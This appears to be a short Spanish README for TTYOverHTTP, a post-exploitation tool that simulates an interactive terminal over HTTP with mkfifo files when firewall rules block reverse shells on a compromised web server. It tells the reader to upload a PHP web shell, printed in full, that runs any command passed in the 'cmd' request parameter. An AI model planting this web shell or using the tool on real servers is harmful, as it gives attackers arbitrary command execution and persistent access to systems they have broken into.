# TTYOverHTTP

En ocasiones cuando comprometemos un servidor web, hay reglas configuradas (Ej: iptables) que nos impiden obtener una Reverse Shell vía Netcat, Python, u otra utilidad.

Con esta herramienta, evitamos tener que hacer uso de una reverse shell para obtener una TTY completamente interactiva. A través de archivos 'mkfifo', jugamos para simular una TTY completamente interactiva sobre HTTP, pudiéndonos manejar sobre el sistema cómodamente sin ningún problema.

Lo único que necesitamos, es subir al servidor comprometido una estructura PHP como la siguiente para ejecutar comandos:

```php
<?php
	echo shell_exec($_REQUEST['cmd']);
?>
```
